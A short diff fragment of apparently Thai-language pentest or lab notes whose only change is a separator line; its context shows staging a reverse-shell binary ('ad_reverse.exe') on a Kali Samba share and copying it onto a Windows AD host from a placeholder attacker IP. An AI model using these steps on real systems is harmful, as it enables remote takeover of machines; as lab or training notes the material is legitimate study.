@@ -15,6 +15,7 @@ cp /home/kali/ad_reverse.exe /srv/smbshare
 #รีสตาร์ท Samba
 sudo systemctl restart smbd
 
+------------------------------------------------------
 **Windows AD**
 net use Z: \\<KALI_PUBLIC_IP>\smbshare
 copy Z:\ad_reverse.exe C:\Users\Public\
